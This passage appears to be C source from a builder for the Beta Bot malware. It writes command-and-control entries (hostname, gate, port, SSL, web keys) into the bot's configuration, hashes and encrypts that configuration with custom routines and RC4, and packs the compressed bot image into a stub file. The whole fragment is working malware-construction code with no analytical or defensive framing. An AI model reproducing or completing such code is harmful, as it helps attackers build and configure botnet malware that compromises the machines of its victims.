		betaConfig.Configs[i].cbSize = sizeof(ConfigEntry);
		betaConfig.Configs[i].Unknown0 = 0x869;

		betaConfig.Configs[i].UnknownX = 0x2B11225B2BE27D81;

		/*GetRandomBytes((BYTE*)&(betaConfig.Configs[0].UnknownX), sizeof(LONGLONG));*/

		betaConfig.Configs[i].ConnectAttemps = 3;
		betaConfig.Configs[i].Port = confEntries[i].Port;

		betaConfig.Configs[i].Unknown5 = 0x2B1EDC59;

		betaConfig.Configs[i].UseSSL = (confEntries[i].useSSL == TRUE) ? TRUE : FALSE;

		betaConfig.Configs[i].Unknown6 = 0x39C9;

		strcpy(betaConfig.Configs[i].Hostname, confEntries[i].Hostname);
		strcpy(betaConfig.Configs[i].Gate, confEntries[i].Gate);

		DWORD lengthOfHostname = strlen(betaConfig.Configs[i].Hostname);

		betaConfig.Configs[i].UnknownHash = UnknownHash((int)(betaConfig.Configs[i].Hostname), lengthOfHostname);
		betaConfig.Configs[i].HostNameHash1 = lengthOfHostname ^ (i + 0xA5F0);
		betaConfig.Configs[i].HostNameHash2 = (lengthOfHostname + 1) ^ 0x1A;

		betaConfig.Configs[i].Unknown8 = 0x2B18B145;

		memcpy(betaConfig.Configs[i].Key1, webKEY1, 8);
		memcpy(betaConfig.Configs[i].Key2, webKEY2, 8);
	}

#pragma endregion

#pragma region Encryption and Hashing

	for(int i = 0; i < 16; i++)
	{
		PVOID currEntry = &betaConfig.Configs[i];

		DecryptAfterAll(currEntry);

		preStubDecrypt(i, betaConfig.CustomID, (ULONG_PTR)currEntry);
	}

	betaConfig.HashOfConfigEntrys = UnknownHash((int)betaConfig.Configs, sizeof(betaConfig.Configs));

	CustomEncrypt((BYTE*)&betaConfig, sizeof(BetaConfig), *(DWORD*)encryptionKey);

	RC4Transform((BYTE*)&betaConfig, sizeof(BetaConfig), encryptionKey, 16, (BYTE*)&configDataEncrypted);

	ctx->ConfigDataHash5[0] = UnknownHash2((int)&configDataEncrypted, sizeof(BetaConfig));
	ctx->ConfigDataHash5[1] = ctx->ConfigDataHash5[0];

	ctx->ConfigDataHash1->Value2 = HasherEGConfig((int)&configDataEncrypted, sizeof(BetaConfig)) ^ 0x9D01;

	ctx->ConfigDataHash2->Value2 = HasherEGConfig((int)&configDataEncrypted, sizeof(BetaConfig)) ^ 0x3AB5;

	ctx->ConfigDataHash3->Value2 = HasherEGConfig((int)&configDataEncrypted, sizeof(BetaConfig)) ^ 0xCC2B;

	ctx->ConfigDataHash4->Value2 = HasherEGConfig((int)&configDataEncrypted, sizeof(BetaConfig)) ^ 0x91C1;

	memcpy(ctx->KeyData, configKey, sizeof(configKey));
	memcpy(ctx->ConfigData, &configDataEncrypted, sizeof(BetaConfig));

#pragma endregion

	memcpy(outKey1, webKEY1, 8);
	memcpy(outKey2, webKEY2, 8);

	DecryptData(ctx->ConfigKeyHash, ctx->KeyData, ctx->ConfigData);

	DWORD compressedSize;

	BYTE* compressedData = CompressData(ctx->DataBuffer, sizeof(bb_OriginalDump), &compressedSize);

	if(compressedData != NULL && compressedSize > 0x10)
	{
		if(WriteToPackerStub(outputFilename, compressedData, compressedSize) == TRUE)
		{
			freeBetaBotContext(ctx);

			return TRUE;
		}
	}

	freeBetaBotContext(ctx);

	return FALSE;
}